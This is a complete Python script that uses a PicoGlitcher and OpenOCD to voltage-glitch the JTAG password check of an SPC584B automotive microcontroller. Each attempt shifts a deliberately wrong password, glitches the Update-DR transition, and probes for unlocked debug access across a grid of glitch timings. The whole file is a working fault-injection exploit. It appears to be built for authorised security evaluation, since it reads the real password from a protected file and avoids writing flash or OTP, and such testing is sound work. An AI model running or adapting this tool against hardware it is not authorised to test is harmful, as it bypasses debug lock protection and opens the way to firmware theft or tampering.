#!/usr/bin/env python3
"""Glitch the SPC584B JTAG password check at Update-DR.

Each attempt resets the target, shifts one known-wrong password to DRPAUSE,
glitches the transition into DRUPDATE, and probes debug access without another
reset. The script never writes flash, UTEST, DCF, lifecycle, or OTP.
"""

from __future__ import annotations

import argparse
from collections import deque
from dataclasses import dataclass
import os
from pathlib import Path
import random
import re
import shutil
import socket
import stat
import struct
import subprocess
import sys
import threading
import time

from findus import Database, PicoGlitcher
from findus.pyboard import PyboardError


SCRIPT_DIR = Path(__file__).resolve().parent
EXPECTED_IDCODE = 0x20144041
PASS_LCSTAT = 0xF7FF4000
PASSWORD_SIZE = 32
RPC_TOKEN = b"\x1a"
TRIGGER_TIMEOUT_MARKER = "Function execution timed out!"

EXIT_NO_ACCESS = 0
EXIT_ERROR = 2
EXIT_ACCESS = 10


class OpenOCDError(RuntimeError):
    pass


@dataclass(frozen=True)
class Result:
    state: str
    color: str
    detail: str

    @property
    def access_observed(self) -> bool:
        return self.state.startswith("ACCESS_")


class OpenOCDSession:
    """Run OpenOCD and exchange commands through its local Tcl socket."""

    def __init__(self, executable: str, adapter_speed_khz: int):
        self.executable = executable
        self.adapter_speed_khz = adapter_speed_khz
        self.port = reserve_local_port()
        self.process: subprocess.Popen[str] | None = None
        self.sock: socket.socket | None = None
        self.output: deque[str] = deque(maxlen=2000)
        self.halted = False
        self.resume_on_close = True

    def command_line(self) -> list[str]:
        commands = [
            "bindto 127.0.0.1",
            "adapter driver ftdi",
            "ftdi vid_pid 0x263d 0x4001",
            "ftdi channel 0",
            "ftdi layout_init 0x0008 0x000b",
            "ftdi layout_signal nTRST -data 0x0100 -oe 0x0100",
            "ftdi layout_signal nSRST -ndata 0x2000 -oe 0x2000",
            f"adapter speed {self.adapter_speed_khz}",
            "transport select jtag",
            "reset_config trst_and_srst",
            (
                "jtag newtap spc584b tap -irlen 6 "
                f"-expected-id 0x{EXPECTED_IDCODE:08x}"
            ),
            "target create spc584b.cpu powerpc -endian big -chain-position spc584b.tap",
            "gdb_port disabled",
            "telnet_port disabled",
            f"tcl_port {self.port}",
        ]
        command = [self.executable]
        for item in commands:
            command.extend(("-c", item))
        return command

    def collect_output(self) -> None:
        assert self.process is not None and self.process.stdout is not None
        for line in self.process.stdout:
            self.output.append(line)

    def __enter__(self) -> "OpenOCDSession":
        self.process = subprocess.Popen(
            self.command_line(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        threading.Thread(target=self.collect_output, daemon=True).start()

        try:
            deadline = time.monotonic() + 10
            while time.monotonic() < deadline:
                if self.process.poll() is not None:
                    raise OpenOCDError(
                        "OpenOCD exited during startup:\n" + "".join(self.output)
                    )
                try:
                    self.sock = socket.create_connection(
                        ("127.0.0.1", self.port), timeout=0.5
                    )
                    self.sock.settimeout(10)
                    break
                except OSError:
                    time.sleep(0.05)
            else:
                raise OpenOCDError("timed out waiting for OpenOCD")

            self.command("init")
            return self
        except Exception:
            self.close()
            raise

    def rpc(self, script: str) -> str:
        if self.sock is None:
            raise OpenOCDError("OpenOCD Tcl connection is unavailable")
        self.sock.sendall(script.encode() + RPC_TOKEN)
        chunks: list[bytes] = []
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise OpenOCDError("OpenOCD closed the Tcl connection")
            if RPC_TOKEN in chunk:
                before, _, _ = chunk.partition(RPC_TOKEN)
                chunks.append(before)
                return b"".join(chunks).decode(errors="replace")
            chunks.append(chunk)

    def command(self, command: str, error_label: str | None = None) -> str:
        response = self.rpc(
            f"set __spc_rc [catch {{{command}}} __spc_msg]; "
            "list $__spc_rc $__spc_msg"
        ).strip()
        match = re.match(r"^(-?\d+)(?:\s+(.*))?$", response, re.DOTALL)
        if not match:
            raise OpenOCDError(f"unexpected OpenOCD response: {response!r}")
        message = (match.group(2) or "").strip()
        if len(message) >= 2 and message[0] == "{" and message[-1] == "}":
            message = message[1:-1]
        if match.group(1) != "0":
            raise OpenOCDError(
                f"OpenOCD command failed: {error_label or command}\n{message}"
            )
        return message

    def read_word(self, address: int) -> int:
        response = self.command(f"read_memory 0x{address:08x} 32 1")
        words = re.findall(r"(?:0x[0-9a-fA-F]+)|(?:\b[0-9]+\b)", response)
        if len(words) != 1:
            raise OpenOCDError(
                f"read at 0x{address:08x} returned {len(words)} words"
            )
        return int(words[0], 0) & 0xFFFFFFFF

    def close(self) -> None:
        if self.sock is not None:
            if self.halted and self.resume_on_close:
                try:
                    self.command("resume")
                except Exception:
                    pass
            try:
                self.rpc("shutdown")
            except Exception:
                pass
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

        if self.process is not None:
            try:
                self.process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.process.terminate()
                try:
                    self.process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    self.process.kill()
            self.process = None

    def __exit__(self, exc_type: object, exc: object, traceback: object) -> None:
        self.close()


def reserve_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])


def find_openocd() -> str:
    configured = os.environ.get("SPC_OPENOCD")
    if not configured:
        raise OpenOCDError(
            "SPC_OPENOCD must point to ST's openocd-automotive-mcu-r1 build"
        )
    executable = shutil.which(configured)
    if executable is None:
        raise OpenOCDError(f"OpenOCD not found: {configured}")

    try:
        probe = subprocess.run(
            [executable, "-c", "target types", "-c", "shutdown"],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired) as error:
        raise OpenOCDError(f"could not validate OpenOCD: {error}") from error
    if probe.returncode != 0:
        raise OpenOCDError(
            f"OpenOCD capability check exited with status {probe.returncode}"
        )
    if "powerpc" not in f"{probe.stdout}\n{probe.stderr}".split():
        raise OpenOCDError("SPC_OPENOCD does not provide the powerpc target")
    return executable


def read_password(path: Path) -> bytes:
    try:
        password = path.read_bytes()
        mode = stat.S_IMODE(path.stat().st_mode)
    except OSError as error:
        raise OpenOCDError(f"cannot read password file {path}: {error}") from error
    if len(password) != PASSWORD_SIZE:
        raise OpenOCDError(f"password file must be exactly {PASSWORD_SIZE} bytes")
    if password in (b"\x00" * PASSWORD_SIZE, b"\xff" * PASSWORD_SIZE):
        raise OpenOCDError("refusing an all-zero or all-0xff password")
    if mode & 0o077:
        raise OpenOCDError(
            f"password file permissions are {mode:04o}; run: chmod 600 {path}"
        )
    return password


def wrong_password_words(password: bytes) -> tuple[int, ...]:
    wrong = bytearray(password)
    wrong[0] ^= 0x01
    return struct.unpack(">8I", wrong)


def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
    session.command("irscan spc584b.tap 0x0e")
    session.command("drscan spc584b.tap 32 0x00000100")
    time.sleep(hold_ms / 1000)
    session.command("irscan spc584b.tap 0x0e")
    session.command("drscan spc584b.tap 32 0x00000000")


def shift_password_to_pause(
    session: OpenOCDSession, password_words: tuple[int, ...]
) -> None:
    if len(password_words) != 8:
        raise OpenOCDError("JTAG password must contain eight words")
    fields = " ".join(f"32 0x{word:08x}" for word in password_words)
    session.command("irscan spc584b.tap 0x07")
    session.command(
        f"drscan spc584b.tap {fields} -endstate DRPAUSE",
        error_label="<redacted 256-bit JTAG password scan to DRPAUSE>",
    )


def compact_error(error: OpenOCDError) -> str:
    return " | ".join(line.strip() for line in str(error).splitlines() if line.strip())


def probe_debug(session: OpenOCDSession, halt_timeout_ms: int) -> Result:
    try:
        session.command("halt 0")
    except OpenOCDError as error:
        session.halted = False
        return Result("PROBE_ERROR", "M", compact_error(error))

    try:
        session.command(f"wait_halt {halt_timeout_ms}")
    except OpenOCDError as error:
        session.halted = False
        return Result("HALT_NOT_OBSERVED", "G", compact_error(error))

    session.halted = True
    try:
        registers = session.command("get_reg -force {pc msr r0}")
        target_state = session.command("spc584b.cpu curstate")
        lcstat = session.read_word(PASS_LCSTAT)
    except OpenOCDError as error:
        return Result("ACCESS_UNVERIFIED", "O", compact_error(error))

    jun = 1 if lcstat & (1 << 30) else 0
    detail = (
        f"registers={registers};state={target_state};"
        f"jun={jun};lc={lcstat & 0x7}"
    )
    if jun:
        return Result("ACCESS_JUN_SET", "R", detail)
    return Result("ACCESS_JUN_CLEAR", "M", detail)


def wait_for_trigger(glitcher: PicoGlitcher, timeout: float) -> bool:
    try:
        glitcher.block(timeout=timeout)
    except PyboardError as error:
        message = " ".join(
            item.decode(errors="replace") if isinstance(item, bytes) else str(item)
            for item in error.args
        )
        if TRIGGER_TIMEOUT_MARKER in message:
            return False
        raise
    return True


def run_attempt(
    session: OpenOCDSession,
    glitcher: PicoGlitcher,
    password_words: tuple[int, ...],
    delay: int,
    length: int,
    args: argparse.Namespace,
) -> Result:
    reset_target(session, args.reset_hold_ms)
    session.halted = False
    shift_password_to_pause(session, password_words)
    glitcher.arm(delay, length)
    session.command("pathmove DRPAUSE DREXIT2 DRUPDATE RUN/IDLE")
    if not wait_for_trigger(glitcher, args.block_timeout):
        return Result("TRIGGER_TIMEOUT", "Y", TRIGGER_TIMEOUT_MARKER)
    return probe_debug(session, args.halt_timeout_ms)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--rpico", required=True, help="Pico Glitcher serial port")
    parser.add_argument(
        "--password-file",
        required=True,
        type=Path,
        help="32-byte SPC584B JTAG password file",
    )
    parser.add_argument("--delay", nargs=2, type=int, default=(0, 1000))
    parser.add_argument("--length", nargs=2, type=int, default=(8, 28))
    parser.add_argument("--step-ns", type=int, default=4)
    parser.add_argument(
        "--attempts", type=int, default=0, help="0 runs the complete grid"
    )
    parser.add_argument("--seed", type=int, default=584)
    parser.add_argument("--adapter-speed-khz", type=int, default=1000)
    parser.add_argument("--reset-hold-ms", type=int, default=50)
    parser.add_argument("--halt-timeout-ms", type=int, default=50)
    parser.add_argument("--block-timeout", type=float, default=2.0)
    parser.add_argument("--no-store", action="store_true")
    return parser.parse_args()


def validate_args(args: argparse.Namespace) -> None:
    for name in ("delay", "length"):
        low, high = getattr(args, name)
        if low < 0 or high < low:
            raise ValueError(f"invalid --{name} range: {low} {high}")
    if args.step_ns <= 0:
        raise ValueError("--step-ns must be positive")
    if args.attempts < 0:
        raise ValueError("--attempts cannot be negative")
    if args.adapter_speed_khz <= 0 or args.halt_timeout_ms <= 0:
        raise ValueError("adapter speed and halt timeout must be positive")
    if args.reset_hold_ms < 0 or args.block_timeout <= 0:
        raise ValueError("invalid reset or trigger timeout")


def pio_tick_ns(frequency_hz: int) -> int:
    if frequency_hz <= 0 or 1_000_000_000 % frequency_hz:
        raise ValueError(f"unsupported PicoGlitcher frequency: {frequency_hz} Hz")
    return 1_000_000_000 // frequency_hz


def build_grid(args: argparse.Namespace) -> list[tuple[int, int]]:
    def values(bounds: tuple[int, int]) -> range:
        low, high = bounds
        first = ((low + args.step_ns - 1) // args.step_ns) * args.step_ns
        return range(first, high + 1, args.step_ns)

    grid = [
        (delay, length)
        for delay in values(tuple(args.delay))
        for length in values(tuple(args.length))
    ]
    if not grid:
        raise ValueError("grid has no points inside the requested ranges")
    random.Random(args.seed).shuffle(grid)
    return grid


def main() -> int:
    args = parse_args()
    database: Database | None = None
    try:
        validate_args(args)
        openocd = find_openocd()
        password_words = wrong_password_words(read_password(args.password_file))

        glitcher = PicoGlitcher()
        try:
            glitcher.init(port=args.rpico, enable_vtarget=False)
        except SystemExit as error:
            raise RuntimeError(
                f"PicoGlitcher initialization exited with status {error.code}"
            ) from error

        tick_ns = pio_tick_ns(int(glitcher.get_cpu_frequency()))
        if args.step_ns % tick_ns:
            raise ValueError(
                f"--step-ns must be a multiple of the Pico timing tick ({tick_ns} ns)"
            )
        glitcher.edge_count_trigger(
            pin_trigger="default", number_of_edges=2, edge_type="rising"
        )
        glitcher.set_lpglitch()

        grid = build_grid(args)
        attempt_limit = len(grid) if args.attempts == 0 else args.attempts
        if attempt_limit > len(grid):
            raise ValueError(
                f"--attempts {attempt_limit} exceeds grid size {len(grid)}"
            )

        if not args.no_store:
            database = Database(
                sys.argv,
                dbname=None,
                resume=False,
                nostore=False,
                column_names=["delay", "length"],
                dirname=str(SCRIPT_DIR / "databases"),
            )

        print("METHOD=ONE_BIT_WRONG_PASSWORD_UPDATE_DR_GLITCH")
        print("TRIGGER=TCK_RISING_EDGE_2_UPDATE_DR_ENTRY_REFERENCE")
        print(f"PICO_PIO_TICK_NS={tick_ns}")
        print(f"SEED={args.seed}")
        print(f"GRID_POINTS={len(grid)}")

        started = time.monotonic()
        with OpenOCDSession(openocd, args.adapter_speed_khz) as session:
            session.command("poll off")
            for attempt, (delay, length) in enumerate(grid[:attempt_limit]):
                result = run_attempt(
                    session, glitcher, password_words, delay, length, args
                )
                invalid_attempt = result.state in {"PROBE_ERROR", "TRIGGER_TIMEOUT"}
                if result.access_observed:
                    session.resume_on_close = False

                rate = (attempt + 1) / max(time.monotonic() - started, 0.001)
                print(
                    f"ATTEMPT={attempt} delay_ns={delay} length_ns={length} "
                    f"result={result.state} rate={rate:.2f}/s detail={result.detail}",
                    flush=True,
                )
                if result.access_observed:
                    print(
                        f"CAMPAIGN_RESULT=ACCESS_OBSERVED attempt={attempt} "
                        f"delay_ns={delay} length_ns={length}",
                        flush=True,
                    )
                    print("DEVICE_LEFT_WITHOUT_ADDITIONAL_RESET=yes", flush=True)

                if database is not None:
                    try:
                        database.insert(
                            attempt,
                            delay,
                            length,
                            result.color,
                            result.detail.encode(errors="replace"),
                        )
                    except Exception as error:
                        if result.access_observed:
                            print(
                                "DATABASE_ERROR_AFTER_ACCESS="
                                f"{type(error).__name__}:{error}",
                                file=sys.stderr,
                                flush=True,
                            )
                            return EXIT_ACCESS
                        raise

                if result.access_observed:
                    return EXIT_ACCESS
                if invalid_attempt:
                    print(
                        f"CAMPAIGN_RESULT=ERROR reason={result.state}",
                        file=sys.stderr,
                        flush=True,
                    )
                    return EXIT_ERROR

        print("CAMPAIGN_RESULT=NO_ACCESS_OBSERVED", flush=True)
        return EXIT_NO_ACCESS
    except KeyboardInterrupt:
        print("\nCAMPAIGN_RESULT=INTERRUPTED", flush=True)
        return 130
    except Exception as error:
        print(
            f"CAMPAIGN_RESULT=ERROR type={type(error).__name__} reason={error}",
            file=sys.stderr,
            flush=True,
        )
        return EXIT_ERROR
    finally:
        if database is not None:
            try:
                database.close()
            except Exception as error:
                print(
                    f"DATABASE_CLOSE_ERROR={type(error).__name__}:{error}",
                    file=sys.stderr,
                    flush=True,
                )


if __name__ == "__main__":
    raise SystemExit(main())
